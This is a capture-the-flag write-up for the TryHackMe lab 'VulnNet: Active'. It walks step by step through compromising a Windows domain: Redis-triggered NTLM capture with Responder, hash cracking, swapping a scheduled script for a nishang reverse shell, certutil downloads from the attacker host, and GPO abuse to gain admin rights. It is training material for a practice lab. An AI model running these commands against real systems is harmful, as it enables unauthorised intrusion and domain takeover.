# VulnNet: Active

**Room Link:** [https://tryhackme.com/r/room/vulnnetactive](https://tryhackme.com/r/room/vulnnetactive)

## **Scans** <a href="#scans" id="scans"></a>

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

## **TCP/139 - NetBIOS** <a href="#tcp-139-netbios" id="tcp-139-netbios"></a>

**Kali**

```
nbtscan $VICTIM
```

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
enum4linux $VICTIM
```

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>



## **TCP/445 - SMB**

No results. Couldn't login anonymously.&#x20;

**Kali**

```
smbclient -L //$VICTIM/ 
```

## **TCP/6379 - Redis** <a href="#tcp-139-netbios" id="tcp-139-netbios"></a>

Added active.thm

**Kali**

```
redis-cli -h active.thm
```

**Kali(redis-cli)**

```
config get *
```

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
responder -I ens5 -dvw  
```

**Kali(redis-cli)**

```
eval "dofile('//$KALI/share')" 0
```

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>



## **TCP/445 - SMB**

**Kali**

```
smbclient -L //$VICTIM/ -U enterprise-security
Password: sand_0873959498
```

<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>

#### Download files <a href="#download-files-1" id="download-files-1"></a>

**Kali**

```
smbclient \\\\$VICTIM\\Enterprise-Share -U enterprise-security
Password: sand_0873959498
```

**Kali(smbclient)**

```
ls
mget *
```

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cat PurgeIrrelevantData_1826.ps1
```

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

## **Initial Shell**

**Kali**

```
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells/
subl Invoke-PowerShellTcp.ps1
```

**Kali(subl)**

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
```

<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cp Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1
```

**Upload payload**

**Kali(smbclient)**

```
put PurgeIrrelevantData_1826.ps1
```

After a few moments we get a connection

**Kali**

<pre><code><strong>rlwrap nc -lvnp 4444
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation&#x20;

### Download SharpHound PS1

This failed because when running the script it would just hang and I had to reset the server. So After I tried with the exe.

**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git
cp BloodHound/Collectors/SharpHound.ps1 .
python2 -m SimpleHTTPServer 82
```

**Victim(Powershell)**

```
certutil -urlcache -f http://$KALI:82/SharpHound.ps1 SharpHound.ps1
powershell -ep bypass
.\SharpHound.ps1 
```

### Download SharpHound EXE

**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git
cp BloodHound/Collectors/SharpHound.exe .
python2 -m SimpleHTTPServer 82
```

**Victim(Powershell)**

```
certutil -urlcache -f http://$KALI:82/SharpHound.exe SharpHound.exe
SharpHound.exe
```

### **Transfer results to Kali**

**Victim(Powershell)**

```
copy 20240405092615_BloodHound.zip C:\Enterprise-Share\
```

**Kali(smbclient)**

```
get 20240405092615_BloodHound.zip
```

### BloodHound  <a href="#bloodhound-installation" id="bloodhound-installation"></a>

**Kali #1**

```
neo4j console
```

**Kali #2**

```
bloodhound --no-sandbox
```

We can just drag the zip file to bloodhound to import it.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Find Shortest Paths to Domain Admins

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Our user enterprise-security has write access to the GPO called "SECURITY-POL-VN"

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SharpGPOAbuse

**Kali**

```
git clone https://github.com/byronkg/SharpGPOAbuse.git
cp SharpGPOAbuse/SharpGPOAbuse-master/SharpGPOAbuse.exe .
python2 -m SimpleHTTPServer 82
```

**Victim(Powershell)**

```
certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
```



This task is running one command which is to add our user enterprise-security to the administrator group

**Victim(Powershell)**

```
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>

After the change is successful we just need to push the GPU for it to work.

**Victim(Powershell)**

```
 gpupdate /force
```

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
psexec.py enterprise-security:sand_0873959498@$VICTIM
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

